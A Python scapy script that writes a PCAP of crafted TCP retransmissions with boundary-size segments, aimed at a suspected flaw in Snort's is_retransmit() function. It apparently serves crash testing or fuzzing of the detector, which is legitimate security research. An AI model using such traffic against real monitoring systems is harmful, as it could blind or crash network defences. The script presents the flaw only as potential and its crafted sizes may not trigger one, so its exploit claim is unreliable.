#!/usr/bin/env python3
from scapy.all import *
import random

# Set up the IP addresses and ports
src_ip = "192.168.1.100"
dst_ip = "192.168.1.200" 
src_port = 12345
dst_port = 80

# Initial sequence numbers
client_isn = random.randint(1000000000, 2000000000)
server_isn = random.randint(1000000000, 2000000000)

packets = []

# TCP 3-way handshake
syn = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="S", seq=client_isn)
packets.append(syn)

syn_ack = IP(src=dst_ip, dst=src_ip)/TCP(sport=dst_port, dport=src_port, flags="SA", 
             seq=server_isn, ack=client_isn+1)
packets.append(syn_ack)

ack = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="A", 
         seq=client_isn+1, ack=server_isn+1)
packets.append(ack)

# Base sequence for data
base_seq = client_isn + 1
current_seq = base_seq

# ------------------------------------------------------------------------
# Here's the key part that specifically targets the vulnerability:
# 
# In tcp_segment_node.cc, there's a potential vulnerability in is_retransmit():
#
# bool TcpSegmentNode::is_retransmit(const uint8_t* rdata, uint16_t rsize,
#    uint32_t rseq, uint16_t orig_dsize, bool *full_retransmit)
# {
#    // ...
#    if ( orig_dsize == unscanned() )
#    {
#        uint16_t cmp_len = ( length <= rsize ) ? length : rsize;
#        if ( !memcmp(data, rdata, cmp_len) )
#            return true;
#    }
#    //Checking for a possible split of segment
#    else if ( (orig_dsize == rsize) and !memcmp(data, rdata, rsize) )
#    {
#        if ( full_retransmit )
#            *full_retransmit = true;
#        return true;
#    }
#    // ...
# }
# ------------------------------------------------------------------------

# Generate segments that will specifically target edge cases in the is_retransmit function
# Focus on manipulating orig_dsize and rsize values

# Let's create a set of packets with specific sizes around the 16-bit boundary
# to potentially trigger issues with the comparisons

# Create segments with normal data
for i in range(5):
    size = 1000  # Regular payload size
    payload = b"A" * size
    
    pkt = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
          seq=current_seq, ack=server_isn+1)/Raw(load=payload)
    packets.append(pkt)
    
    # ACK from server
    ack = IP(src=dst_ip, dst=src_ip)/TCP(sport=dst_port, dport=src_port, flags="A", 
          seq=server_isn+1, ack=current_seq + size)
    packets.append(ack)
    
    current_seq += size

# Now create segments that appear to be retransmissions but with carefully crafted sizes
# to trigger potential issues in the is_retransmit() function

# Original segment
orig_seq = current_seq
orig_size = 1400
orig_payload = b"B" * orig_size

orig_pkt = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
           seq=orig_seq, ack=server_isn+1)/Raw(load=orig_payload)
packets.append(orig_pkt)

# Server ACK
ack = IP(src=dst_ip, dst=src_ip)/TCP(sport=dst_port, dport=src_port, flags="A", 
      seq=server_isn+1, ack=orig_seq + orig_size)
packets.append(ack)

current_seq += orig_size

# Now send multiple retransmissions with manipulated sizes

# Case 1: Same sequence, smaller payload 
# This tests the branch: uint16_t cmp_len = ( length <= rsize ) ? length : rsize;
retrans1_size = 1200  # Smaller than original
retrans1_payload = b"B" * retrans1_size

retrans1_pkt = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
              seq=orig_seq, ack=server_isn+1)/Raw(load=retrans1_payload)
packets.append(retrans1_pkt)

# Case 2: Same sequence, larger payload
# This may cause comparison issues
retrans2_size = 1600  # Larger than original
retrans2_payload = b"B" * retrans2_size

retrans2_pkt = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
              seq=orig_seq, ack=server_isn+1)/Raw(load=retrans2_payload)
packets.append(retrans2_pkt)

# Targeting potential overflow in the second condition
# Testing: else if ( (orig_dsize == rsize) and !memcmp(data, rdata, rsize) )
for i in range(10):
    # Create segments with sizes at boundary conditions
    size = 65535 - i  # Near uint16_t max
    
    # We'll use a size that might cause issues with rsize/orig_dsize comparison
    payload = b"C" * min(size, 1500)  # Limit actual payload to avoid huge packets
    
    pkt = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
          seq=current_seq, ack=server_isn+1)/Raw(load=payload)
    
    # Manipulate the length field directly to create inconsistency
    if hasattr(pkt['TCP'], 'dataofs'):
        # Force specific data offset for potential overflow
        pkt['TCP'].dataofs = 5  # 20 bytes, minimum TCP header
    
    packets.append(pkt)
    
    # Follow with potential "retransmission" that has manipulated size info
    retrans_pkt = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
                 seq=current_seq, ack=server_isn+1)/Raw(load=payload)
    packets.append(retrans_pkt)
    
    current_seq += len(payload)

# End with a FIN to close connection
fin = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="FA", 
      seq=current_seq, ack=server_isn+1)
packets.append(fin)

fin_ack = IP(src=dst_ip, dst=src_ip)/TCP(sport=dst_port, dport=src_port, flags="FA", 
          seq=server_isn+1, ack=current_seq+1)
packets.append(fin_ack)

# Write to PCAP
wrpcap("snort_tcp_retrans_crash.pcap", packets)
print(f"Created PCAP with {len(packets)} packets")
